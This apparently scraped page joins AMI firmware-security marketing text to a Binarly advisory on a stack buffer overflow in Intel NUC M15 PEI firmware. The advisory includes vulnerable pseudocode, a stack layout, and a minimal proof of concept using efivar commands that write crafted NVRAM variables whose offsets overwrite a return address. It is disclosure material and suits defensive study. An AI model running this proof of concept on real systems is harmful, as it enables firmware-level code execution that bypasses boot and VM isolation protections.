    - #### AMI FirST Builds a Platform of Trust

      The supply chain is a significant cybersecurity threat for mission-critical servers in modern data centers or enterprises. Before a device leaves the manufacturing site, it’s crucial for the original design manufacturers (ODMs), OEMs and firmware suppliers to work together to ensure the firmware is attested. At AMI, we are committed to helping maintain firmware integrity throughout the supply chain.

    - #### Zero Trust Security Starts with Firmware

      Zero Trust security is essential for protecting an organization’s infrastructure and business critical data in today’s digital transformation. But without secure firmware running on the infrastructure, Zero Trust strategy weakens significantly.

      From your car to airport kiosks and power grids, nearly all technology is powered by firmware and for that reason, firmware attacks are on the rise. Firmware attacks are much more dangerous than OS-based attacks because firmware is invisible to OS-based security solutions.

      AMI’s Zero Trust firmware security solutions can help maintain firmware integrity and strengthen organizations’ Zero trust strategy.

    - #### Empower Your Arm Devices With AMI Foundational Firmware

      As an Arm license partner, one of your main objectives is to bring your designs to the market as quickly and efficiently as possible. However, this process can be fraught with challenges, and one of the biggest hurdles you may encounter is in the development of firmware. Firmware is a critical component of your device, ensuring that it powers on, runs securely, and stays on during its lifecycle. Developing firmware that meets these requirements can be a complex and time-consuming task, but it is essential for the success of your device.

## Encryption Key for Secure Data Transmission

AMI recommends that you encrypt sensitive information to protect it from being viewed by unintended recipients. AMI can exchange emails with you using encryption. AMI highly suggests that you encrypt and decrypt email communications between AMI and yourself using an email client that supports encryption.

It is good security practice that you only trust ***validated encryption keys***. Do not trust encryption keys that have not been validated. It is important to also validate your copy of the AMI public encryption key to ensure it is legitimate.

Binarly REsearch Team has discovered a stack buffer overflow vulnerability on Intel platforms allowing a possible attacker to execute arbitrary code during PEI phase.![Vendors Affected Icon](https://cdn.prod.website-files.com/65d392ca924b59f0fcd873eb/6698dd226326f191c074ad7b_Vendors.svg)
### Vendors Affected

Intel[Intel](/advisory-vendor/intel),![Affected Products icon](https://cdn.prod.website-files.com/65d392ca924b59f0fcd873eb/6698dd3fad8b6d927d1b45c4_Affected%20products.svg)
### Affected Products

Intel NUC M15
## Potential Impact

A potential attacker can execute an arbitrary code at the time of the PEI phase and influence the subsequent boot stages. This can lead to the mitigations bypassing, physical memory contents disclosure, discovery of any secrets from any Virtual Machines (VMs) and bypassing memory isolation and confidential computing boundaries. Additionally, an attacker can build a payload which can be injected into the SMRAM memory.

## Summary

**Binarly REsearch Team** has discovered a stack buffer overflow vulnerability on Intel platforms allowing a possible attacker to execute arbitrary code during PEI phase.

## Affected Intel firmwares with confirmed impact by Binarly REsearch Team

| Device/Firmware | File Name | SHA256 (File PE32 section) | File GUID |
| --- | --- | --- | --- |
| Intel NUC M15 | PlatformInitAdvancedPreMem | 644044fdb8daea30a7820e0f5f88dbf5cd460af72fbf70418e9d2e47efed8d9b | EEEE611D-F78F-4FB9-B868-55907F169280 |

## Potential impact

A potential attacker can execute an arbitrary code at the time of the PEI phase and influence the subsequent boot stages. This can lead to the mitigasions bypassing, physical memory contents disclosure, discovery of any secrets from any Virtual Machines (VMs) and bypassing memory isolation and confidential computing boundaries. Additionally, an attacker can build a payload which can be injected into the SMRAM memory.

## Vulnerability description

The pseudocode for vulnerable function is shown below:

```
int __thiscall sub_FFAE2B82(void *this)
{
  ...
  const EFI_PEI_SERVICES **PeiServices;
  char CpuSetupData[1072];
  UINTN DataSize;
  EFI_PEI_READ_ONLY_VARIABLE2_PPI *Ppi;

  ...
  DataSize = 1072;
  Ppi->GetVariable(Ppi, L"SaSetup", &gSaSetupGuid, 0, &DataSize, CpuSetupData);
  Ppi->GetVariable(Ppi, L"CpuSetup", &gCpuSetupGuid, 0, &DataSize, CpuSetupData);
  ...
  return 0;
}
```

If the value of the `SaSetup` NVRAM variable is larger than `1072` bytes, then after the first call of the `Ppi->GetVariable()` service, the `DataSize` value will be overwritten with the real size of the `SaSetup` NVRAM variable.

After second call of the `Ppi->GetVariable()` service stack overflow may occur.An overflow of `24` bytes is enough to execute arbitrary code:

```
-00000440 CpuSetupData    db 1072 dup(?)
-00000010 var_10          db ?
-0000000F                 db ? ; undefined
-0000000E var_E           dd ?
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008 DataSize        dd ?
-00000004 Ppi             dd ?                    ; offset
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```
## Minimal POC

```
sudo efivar -w -f SaSetupData_new.bin --name 72c5e28c-7783-43a1-8767-fad73fccafa4-SaSetup
sudo efivar -w -f CpuSetupData_new.bin --name b08f97ff-e6e8-4193-a997-5e9e9b0adb32-CpuSetup
sudo reboot
```

The data in the file `SaSetupData_new.bin` may be as follows:

| Offset | Data |
| --- | --- |
| 0x0 | Old data of SaSetup NVRAM variable |
| 0x430 | Some data |
| 0x444 | Last dword |

The data in the file `CpuSetupData_new.bin` may be as follows:

| Offset | Data |
| --- | --- |
| 0x0 | Old data of CpuSetup NVRAM variable |
| 0x244 | Some data |
| 0x444 | New return address |

## Disclosure timeline

This bug is subject to a 90 day disclosure deadline. After 90 days elapsed or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public.
